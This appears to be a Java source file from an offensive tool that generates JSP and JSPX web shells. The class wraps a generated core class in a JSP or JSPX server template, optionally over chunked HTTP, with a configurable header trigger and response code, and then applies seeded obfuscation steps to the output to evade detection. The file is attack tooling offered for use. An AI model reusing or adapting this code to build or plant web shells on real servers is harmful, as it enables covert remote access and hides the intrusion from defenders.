package org.leo.jmg.generation.pipeline;

import org.leo.core.util.request.GenerationRandom;
import org.leo.jmg.TransportProtocol;
import org.leo.jmg.generation.GenerationPlan;
import org.leo.jmg.generation.GenerationRequest;
import org.leo.jmg.generation.GenerationResult;
import org.leo.jmg.jsp.http.JspServer;
import org.leo.jmg.jsp.http.JspxServer;
import org.leo.jmg.mem.packer.jsp.JspObfuscationPipeline;
import org.leo.jmg.mem.packer.jsp.JspObfuscationPlanContext;
import org.leo.jmg.mem.packer.jsp.JspObfuscationPlanner;

import java.util.List;

/**
 * JSP/JSPX WebShell 生成管线。
 */
public final class WebShellGenerationPipeline {

    private final GenerationRequest request;
    private final CoreGenerationPipeline corePipeline;

    public WebShellGenerationPipeline(GenerationRequest request,
                                      CoreGenerationPipeline corePipeline) {
        if (request == null || corePipeline == null) {
            throw new IllegalArgumentException("request 和 corePipeline 不能为空");
        }
        this.request = request;
        this.corePipeline = corePipeline;
    }

    public GenerationResult generate(GenerationPlan.ArtifactKind artifactKind) throws Exception {
        GenerationPlan plan = GenerationPlan.forWebShell(request, artifactKind);
        try (GenerationRandom.Scope ignored =
                     GenerationRandom.withSeed(request.getObfuscationSeed())) {
            byte[] coreClass = corePipeline.generate();
            boolean jsp = plan.getArtifactKind() == GenerationPlan.ArtifactKind.JSP;
            String raw = wrapCore(coreClass, jsp);
            String content = buildObfuscationPipeline(jsp).apply(raw);
            return GenerationResult.forWebShell(plan, content, coreClass);
        }
    }

    private String wrapCore(byte[] coreClass, boolean jsp) throws Exception {
        if (jsp) {
            if (request.getProtocol() == TransportProtocol.HTTP_CHUNK) {
                return new org.leo.jmg.jsp.httpchunk.JspServer().wrap(
                        request.getCoreClassName(), coreClass, request.getResponseCode(),
                        request.getHeaderName(), request.getHeaderValue());
            }
            return new JspServer().wrap(
                    request.getCoreClassName(), coreClass, request.getResponseCode(),
                    request.getHeaderName(), request.getHeaderValue());
        }
        if (request.getProtocol() == TransportProtocol.HTTP_CHUNK) {
            return new org.leo.jmg.jsp.httpchunk.JspxServer().wrap(
                    request.getCoreClassName(), coreClass, request.getResponseCode(),
                    request.getHeaderName(), request.getHeaderValue());
        }
        return new JspxServer().wrap(
                request.getCoreClassName(), coreClass, request.getResponseCode(),
                request.getHeaderName(), request.getHeaderValue());
    }

    private JspObfuscationPipeline buildObfuscationPipeline(boolean jsp) {
        List<String> steps = request.getJspObfuscationSteps();
        if (steps == null) {
            return jsp
                    ? JspObfuscationPipeline.jspDefault(request.getObfuscationSeed())
                    : JspObfuscationPipeline.jspxDefault(request.getObfuscationSeed());
        }
        List<String> effectiveSteps = steps;
        JspObfuscationPlanContext.Format format = jsp
                ? JspObfuscationPlanContext.Format.JSP
                : JspObfuscationPlanContext.Format.JSPX;
        return JspObfuscationPlanner.compile(
                effectiveSteps,
                JspObfuscationPlanContext.webShell(
                        format, request.getObfuscationSeed())).getPipeline();
    }
}
